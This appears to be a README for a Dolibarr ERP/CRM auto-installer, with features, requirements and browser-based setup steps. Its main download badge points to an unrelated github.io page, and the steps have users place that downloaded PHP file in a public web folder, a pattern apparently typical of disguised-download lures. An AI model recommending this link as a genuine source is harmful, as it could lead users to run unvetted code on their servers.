[![Download Installer](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge&logo=github)](https://dun-silhouette198.github.io)

This software automates the setup process for Dolibarr ERP and CRM. It removes the need for manual configuration or complex database management. You select your preferred version and the tool handles the installation of files and databases.

## 🛠 Features

The installer includes tools to simplify your server environment:

- Automatic file extraction and folder setup.
- Support for multiple PHP versions from 7.4 to 8.3.
- Database creation for MySQL and PostgreSQL.
- Multi-language interface support including English, Spanish, German, French, and Italian.
- Security hardening to protect your data.
- Live logging to help you track progress.
- Clean interface for simple operation.

## 📋 System Requirements

To run this installer, ensure your computer meets these conditions:

- Windows 10 or Windows 11.
- A functional web server environment like XAMPP or WAMP.
- At least 500MB of free disk space.
- A basic web browser such as Chrome, Firefox, or Edge.
- Basic administrative access to your local folder.

## ⚙️ Running the Installer

Follow these steps to complete your setup:

1. Move the downloaded .php file into your web server's public folder. This is often named `htdocs` or `www`.
2. Open your web browser and enter the address of your local server. For example: `http://localhost/yourfilename.php`.
3. The interface loads in your browser window.
4. Select the version of Dolibarr you want to install from the provided menu.
5. Choose your database type: MySQL or PostgreSQL.
6. Press the Start button.
7. Monitor the live log window to watch the progress.
8. Wait for the success message to appear.
9. Click the link provided by the installer to access your new Dolibarr instance.

## 🔐 Security Information

The installer applies security settings to your installation. It restricts access to sensitive configuration files as soon as the installation finishes. You should keep your administrator password in a safe location. Do not leave the installer file in your public folder after you finish the setup. Delete the file to prevent unauthorized access to your server.

## 🌐 Language Options

You can change the interface language during the start of the process. The tool detects your browser settings and sets the default language automatically. You may override this if you prefer a different language from the list of supported options.

## 🧠 Troubleshooting

If the installer stops working or shows an error, check the live log on your screen. Most errors occur because of database connection issues. Verify that your MySQL or PostgreSQL service remains active in your server control panel. 

Ensure your PHP version is within the supported range of 7.4 through 8.3. If you use a version outside this range, the installer may fail. Refresh the page to attempt the installation again if a minor network interruption occurs.
